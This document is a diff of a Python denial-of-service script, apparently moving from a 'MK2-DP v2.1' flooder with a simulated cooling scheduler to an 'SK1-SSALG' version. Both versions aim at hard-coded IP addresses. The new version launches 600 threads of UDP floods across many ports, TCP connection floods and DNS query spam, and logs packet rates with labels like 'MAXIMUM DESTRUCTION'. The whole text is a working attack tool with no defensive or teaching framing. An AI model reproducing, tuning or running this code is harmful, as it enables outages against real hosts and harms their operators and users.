@@ -2,375 +2,210 @@ import socket
 import threading
 import time
 import random
-import gc
-from datetime import datetime
+import struct
 
 # TARGET
-TARGET_IP = "62.109.121.42"
+TARGET_IP = "45.60.39.88"
 
-# MK2-DP v2.1 CONFIG
-UDP_THREADS = 300      # 80% priority
-SYN_THREADS = 150      # 20% priority  
-DNS_THREADS = 100      # 15% priority
-TOTAL_THREADS = 550
+# RAW POWER CONFIG
+UDP_THREADS = 400      # Raw UDP power
+SYN_THREADS = 150      # Connection floods  
+DNS_THREADS = 50       # DNS focus
+TOTAL_THREADS = 600    # ALL AT ONCE
 
-# SOCKET POOLS (EFFICIENT)
-UDP_POOL_SIZE = 120
-SYN_POOL_SIZE = 60
+# SOCKET CONFIG
+MAX_SOCKETS = 200
 
-# COOLING THRESHOLDS
-COOLING_SCHEDULE = {
-    50: 180,    # 50°C = 3 minutes
-    60: 420,    # 60°C = 7 minutes
-    70: 600,    # 70°C = 10 minutes
-    71: 720,    # 70°C+ = 12 minutes
-}
-TEMP_CHECK_INTERVAL = 1200  # Check every 20 minutes
+# Global trackers
+packets_sent = 0
+bytes_sent = 0
+attack_start = time.time()
 
-# Global state
-attack_active = True
-cooling_active = False
-estimated_temp = 45  # Start at 45°C
-last_temp_check = time.time()
-cooling_end_time = 0
-
-# Stats with efficiency tracking
-class EfficientCounter:
-    def __init__(self):
-        self.value = 0
-        self.last_value = 0
-        self.peak = 0
-        
-    def inc(self, amt=1):
-        self.value += amt
-        if self.value > self.peak:
-            self.peak = self.value
-            
-    def get_pps(self, interval):
-        current = self.value
-        pps = (current - self.last_value) / interval if interval > 0 else 0
-        self.last_value = current
-        return int(pps)
+# ==================== RAW UDP CANNON ====================
+def raw_udp_cannon(thread_id):
+    global packets_sent, bytes_sent
     
-    def get_total(self):
-        return self.value
+    # Create dedicated socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # HUGE buffer
     
-    def reset(self):
-        self.value = 0
-
-stats = {
-    'total': EfficientCounter(),
-    'udp': EfficientCounter(),
-    'syn': EfficientCounter(),
-    'dns': EfficientCounter(),
-}
-
-# Initialize efficient socket pools
-udp_pool = []
-syn_pool = []
-
-def init_efficient_pools():
-    global udp_pool, syn_pool
-    
-    # UDP Pool - optimized for speed
-    udp_pool = []
-    for _ in range(UDP_POOL_SIZE):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)  # Larger buffer
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            udp_pool.append(sock)
-        except:
-            pass
-    
-    # SYN Pool - optimized for connections
-    syn_pool = []
-    for _ in range(SYN_POOL_SIZE):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.0005)  # Faster timeout
-            syn_pool.append(sock)
-        except:
-            pass
-
-init_efficient_pools()
-
-# ==================== EFFICIENT ATTACK METHODS ====================
-def udp_efficiency_expert(worker_id):
-    """80% priority - Maximum efficiency UDP"""
-    sock = udp_pool[worker_id % len(udp_pool)]
-    port_sequence = 1
+    # RAW PAYLOADS - MAX DAMAGE
+    payloads = [
+        b'\xFF' * 1024,  # Full blast
+        b'\x00' * 1024,  # Null blast
+        b'\xAA\x55' * 512,  # Pattern
+        random.randbytes(1024),  # Chaos
+        b'X' * 1024,  # Simple nuke
+    ]
     
     while True:
-        if not attack_active or cooling_active:
-            time.sleep(0.01)  # Minimal sleep during cool
-            continue
-        
         try:
-            # BATCH PROCESSING: 8 packets per cycle
-            for batch in range(8):
-                # Smart port selection
-                if batch < 4:
-                    port = random.choice([53, 80, 443, 123])  # Critical ports
-                else:
-                    port = (port_sequence * 997) % 65535 + 1  # Fast calculation
-                    port_sequence += 1
+            # MAXIMUM SEND - NO DELAYS
+            for _ in range(15):  # 15 packets per loop
+                payload = random.choice(payloads)
                 
-                # Optimized payload (64-256 bytes)
-                payload_size = 64 if batch % 2 == 0 else 128
-                payload = random.randbytes(payload_size)
+                # ALL PORTS AT ONCE
+                for port in [53, 80, 443, 123, 161, 1900, 5060, 8080]:
+                    sock.sendto(payload, (TARGET_IP, port))
+                    packets_sent += 1
+                    bytes_sent += len(payload)
                 
-                # ULTRA EFFICIENT SEND
-                sock.sendto(payload, (TARGET_IP, port))
-                
-                # Update stats
-                stats['total'].inc()
-                stats['udp'].inc()
-            
-            # 80% PRIORITY: Minimal sleep
-            if random.random() < 0.2:  # 20% chance of micro-sleep
-                time.sleep(0.0001)
-                
+                # RANDOM PORTS TOO
+                for _ in range(5):
+                    port = random.randint(1, 65535)
+                    sock.sendto(payload, (TARGET_IP, port))
+                    packets_sent += 1
+                    bytes_sent += len(payload)
+                    
         except:
-            # Quick recovery
+            # INSTANT RECOVERY
             try:
                 sock.close()
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
-                udp_pool[worker_id % len(udp_pool)] = sock
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
             except:
                 pass
 
-def syn_efficiency_expert(worker_id):
-    """20% priority - Efficient SYN connections"""
-    sock_idx = worker_id % len(syn_pool)
+# ==================== SYN NUKE ====================
+def syn_nuke(thread_id):
+    global packets_sent
     
-    # Pre-defined target ports for efficiency
-    target_ports = [80, 443, 22, 53, 3389, 8080, 8443]
-    port_index = 0
+    # Multiple sockets per thread
+    socks = []
+    for _ in range(3):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.0001)  # ULTRA FAST
+            socks.append(s)
+        except:
+            pass
+    
+    target_ports = [80, 443, 22, 53, 3389, 8080, 8443, 21, 25, 110, 143]
     
     while True:
-        if not attack_active or cooling_active:
-            time.sleep(0.02)  # Slightly longer sleep
-            continue
-        
         try:
-            sock = syn_pool[sock_idx]
-            port = target_ports[port_index % len(target_ports)]
-            port_index += 1
+            # ATTACK ALL PORTS AT ONCE
+            for port in target_ports:
+                for sock in socks:
+                    try:
+                        sock.connect_ex((TARGET_IP, port))
+                        packets_sent += 1
+                    except:
+                        pass
             
-            # EFFICIENT CONNECT
-            result = sock.connect_ex((TARGET_IP, port))
-            
-            stats['total'].inc()
-            stats['syn'].inc()
-            
-            if result == 0:
-                # Quick close and replace
-                sock.close()
-                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                syn_pool[sock_idx].settimeout(0.0005)
-            
-            # 20% PRIORITY: More sleep
-            if random.random() < 0.5:
-                time.sleep(0.0005)
+            # Create new sockets if old ones fail
+            if random.random() < 0.1:
+                for i in range(len(socks)):
+                    try:
+                        socks[i].close()
+                        socks[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        socks[i].settimeout(0.0001)
+                    except:
+                        pass
+                        
+        except:
+            pass
+
+# ==================== DNS HAMMER ====================
+def dns_hammer(thread_id):
+    global packets_sent, bytes_sent
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # DNS amplification payloads
+    dns_payloads = [
+        # Standard DNS query
+        b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x07example\x03com\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
+        # Larger DNS
+        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03www\x06google\x03com\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
+        # Random DNS
+        random.randbytes(100),
+    ]
+    
+    while True:
+        try:
+            # MASSIVE DNS SPAM
+            for _ in range(20):  # 20 packets per loop
+                payload = random.choice(dns_payloads)
+                sock.sendto(payload, (TARGET_IP, 53))
+                packets_sent += 1
+                bytes_sent += len(payload)
                 
         except:
-            # Efficient recovery
             try:
                 sock.close()
-                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                syn_pool[sock_idx].settimeout(0.0005)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             except:
                 pass
 
-def dns_efficiency_expert(worker_id):
-    """15% priority - Specialized DNS attacks"""
-    sock = udp_pool[(worker_id + UDP_POOL_SIZE//2) % len(udp_pool)]
-    
-    # DNS payloads (pre-generated for efficiency)
-    dns_payloads = [
-        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01',
-        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04mail\x06google\x03com\x00\x00\x01\x00\x01',
-        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05cloud\x06google\x03com\x00\x00\x01\x00\x01',
-    ]
-    payload_index = 0
-    
-    while True:
-        if not attack_active or cooling_active:
-            time.sleep(0.015)  # Medium sleep
-            continue
-        
-        try:
-            # RAPID DNS FIRE
-            payload = dns_payloads[payload_index % len(dns_payloads)]
-            payload_index += 1
-            
-            # Send 3 DNS packets per cycle
-            for _ in range(3):
-                sock.sendto(payload, (TARGET_IP, 53))
-                stats['total'].inc()
-                stats['dns'].inc()
-            
-            # 15% PRIORITY: Balanced sleep
-            if random.random() < 0.3:
-                time.sleep(0.001)
-                
-        except:
-            pass
+# ==================== LAUNCH ALL METHODS ====================
+print("⚡ SK1-SSALG INITIALIZING")
+print(f"🎯 TARGET: {TARGET_IP}")
+print(f"💀 THREADS: {TOTAL_THREADS}")
+print(f"🔥 METHODS: ALL AT ONCE")
+print("="*50)
 
-# ==================== SMART COOLING SYSTEM ====================
-def smart_cooling_manager():
-    global cooling_active, estimated_temp, cooling_end_time, last_temp_check
-    
-    while True:
-        current_time = time.time()
-        
-        # Check temperature every 20 minutes
-        if current_time - last_temp_check >= TEMP_CHECK_INTERVAL:
-            # Simulate temperature estimation based on activity
-            base_temp = 45
-            activity_factor = min(1.0, stats['total'].get_total() / 1000000)
-            estimated_temp = base_temp + (activity_factor * 30)
-            
-            last_temp_check = current_time
-            
-            # Determine cooling duration
-            cooling_seconds = 0
-            for temp_threshold, seconds in sorted(COOLING_SCHEDULE.items()):
-                if estimated_temp >= temp_threshold:
-                    cooling_seconds = seconds
-            
-            if cooling_seconds > 0:
-                cooling_active = True
-                cooling_end_time = current_time + cooling_seconds
-                
-                # Perform cooling actions
-                gc.collect()  # Clean RAM
-                
-                # Refresh socket pools
-                refresh_socket_pools()
-                
-                print(f"🧊 SMART COOLING: {estimated_temp}°C → {cooling_seconds//60}min")
-        
-        # Check if cooling should end
-        if cooling_active and current_time >= cooling_end_time:
-            cooling_active = False
-            print("🔥 COOLING COMPLETE: Resuming attack")
-        
-        time.sleep(1)
+# Start UDP Cannons
+for i in range(UDP_THREADS):
+    t = threading.Thread(target=raw_udp_cannon, args=(i,))
+    t.daemon = True
+    t.start()
 
-def refresh_socket_pools():
-    """Refresh 25% of sockets efficiently"""
-    # Refresh UDP sockets
-    refresh_count = max(1, len(udp_pool) // 4)
-    for i in range(refresh_count):
-        try:
-            udp_pool[i].close()
-            udp_pool[i] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            udp_pool[i].setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
-        except:
-            pass
-    
-    # Refresh SYN sockets
-    refresh_count = max(1, len(syn_pool) // 4)
-    for i in range(refresh_count):
-        try:
-            syn_pool[i].close()
-            syn_pool[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            syn_pool[i].settimeout(0.0005)
-        except:
-            pass
+# Start SYN Nukes  
+for i in range(SYN_THREADS):
+    t = threading.Thread(target=syn_nuke, args=(i,))
+    t.daemon = True
+    t.start()
 
-# ==================== DEPLOY EFFICIENT ARMY ====================
-def deploy_efficient_army():
-    print(f"⚡ DEPLOYING {TOTAL_THREADS} EFFICIENT THREADS")
-    
-    # UDP Efficiency Experts (300 threads)
-    for i in range(UDP_THREADS):
-        t = threading.Thread(target=udp_efficiency_expert, args=(i,))
-        t.daemon = True
-        t.start()
-    
-    # SYN Efficiency Experts (150 threads)
-    for i in range(SYN_THREADS):
-        t = threading.Thread(target=syn_efficiency_expert, args=(i,))
-        t.daemon = True
-        t.start()
-    
-    # DNS Efficiency Experts (100 threads)
-    for i in range(DNS_THREADS):
-        t = threading.Thread(target=dns_efficiency_expert, args=(i,))
-        t.daemon = True
-        t.start()
-    
-    print(f"✅ {TOTAL_THREADS} THREADS ACTIVE (80/20/15 PRIORITY)")
+# Start DNS Hammers
+for i in range(DNS_THREADS):
+    t = threading.Thread(target=dns_hammer, args=(i,))
+    t.daemon = True
+    t.start()
 
-# ==================== LOGGING SYSTEM ====================
-def get_wifi_type():
-    """Simulate WiFi type detection"""
-    types = ["WiFi1", "WiFi2", "WiFi3", "WiFi4", "WiFi5"]
-    # Simple simulation based on time
-    hour = datetime.now().hour
-    return types[hour % 5]
+print(f"✅ {TOTAL_THREADS} THREADS FIRING")
+print("="*50)
+print("SK1-SSALG ACTIVE | ALL METHODS SIMULTANEOUS\n")
 
-# Deploy everything
-deploy_efficient_army()
-threading.Thread(target=smart_cooling_manager, daemon=True).start()
-
-# ==================== MAIN LOGGING LOOP ====================
-attack_start = time.time()
-last_log_time = time.time()
-
-print("\n" + "="*60)
-print("MK2-DP v2.1 - EFFICIENCY MAXIMIZED")
-print(f"TARGET: {TARGET_IP}")
-print(f"THREADS: {TOTAL_THREADS} (300UDP/150SYN/100DNS)")
-print(f"PRIORITY: 80%/20%/15%")
-print("="*60 + "\n")
+# ==================== LOGGING ====================
+last_log = time.time()
+peak_pps = 0
+peak_bw = 0
 
 while True:
-    time.sleep(5)  # Log every 5 seconds
-    current_time = time.time()
-    elapsed = current_time - last_log_time
-    total_duration = int(current_time - attack_start)
-    last_log_time = current_time
+    time.sleep(1)
+    current = time.time()
+    elapsed = current - last_log
+    last_log = current
     
-    # Calculate PPS
-    total_pps = stats['total'].get_pps(elapsed)
-    udp_pps = stats['udp'].get_pps(elapsed)
-    syn_pps = stats['syn'].get_pps(elapsed)
-    dns_pps = stats['dns'].get_pps(elapsed)
+    # Calculate stats
+    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
+    bw_mbps = (bytes_sent * 8) / (elapsed * 1000000) if elapsed > 0 else 0
+    duration = int(current - attack_start)
     
-    # Get current timezone
-    timezone = time.strftime('%z')
-    if not timezone:
-        timezone = "GMT+2"  # Default
+    # Track peaks
+    if pps > peak_pps:
+        peak_pps = pps
+    if bw_mbps > peak_bw:
+        peak_bw = bw_mbps
     
-    # WiFi type
-    wifi_type = get_wifi_type()
+    # Reset counters
+    packets_sent = 0
+    bytes_sent = 0
     
-    # Format PPS
-    if total_pps >= 10000:
-        pps_display = f"{total_pps//1000}K PPS"
-    else:
-        pps_display = f"{total_pps} PPS"
+    # Display
+    print(f"SK1-SSALG | {pps:,}/s | {bw_mbps:.1f}Mbps | {duration}s")
     
-    # Status indicator
-    if cooling_active:
-        status = f"🧊{int(cooling_end_time - current_time)}s"
-    else:
-        status = f"🔥{total_duration}s"
+    # Show peak every 10 seconds
+    if duration % 10 == 0:
+        print(f"   PEAK: {peak_pps:,}/s | {peak_bw:.1f}Mbps")
     
-    # Display MK2-DP logging
-    print(f"{{SK1-SSALG | GMT{timezone}}}")
-    print(f"[{status}] |  | {pps_display} | {wifi_type} | Z$OMBS-{TOTAL_THREADS}")
-    
-    # Efficiency breakdown (every 30 seconds)
-    if total_duration % 30 < 5:
-        print(f"   UDP:{udp_pps}/s SYN:{syn_pps}/s DNS:{dns_pps}/s | T:{estimated_temp}°C")
-    
-    # Cooling status if active
-    if cooling_active:
-        remaining = int(cooling_end_time - current_time)
-        print(f"   🧊 COOLING: {remaining}s remaining | Temp: {estimated_temp}°C")
+    # Performance status
+    if pps > 80000:
+        print("   STATUS: MAXIMUM DESTRUCTION")
+    elif pps > 50000:
+        print("   STATUS: EXTREME FIREPOWER")
+    elif pps > 30000:
+        print("   STATUS: HEAVY ASSAULT")
+    elif pps > 15000:
+        print("   STATUS: ACTIVE COMBAT")
